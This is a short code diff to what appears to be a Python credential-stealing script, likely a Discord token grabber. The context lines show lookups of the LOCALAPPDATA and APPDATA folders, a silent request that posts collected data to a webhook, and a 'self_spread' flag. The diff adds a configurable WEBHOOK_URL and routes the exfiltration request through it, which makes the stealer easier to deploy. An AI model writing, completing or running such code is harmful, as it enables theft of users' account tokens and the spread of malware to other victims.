@@ -11,6 +11,8 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
+WEBHOOK_URL = "" # Insert webhook url here
+
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -192,7 +194,8 @@ def main():
         "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
     }
     try:
-        urlopen(Request("WEBHOOK", data=dumps(webhook).encode(), headers=getHeader()))
+        
+        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
     except:
         pass
     if self_spread:
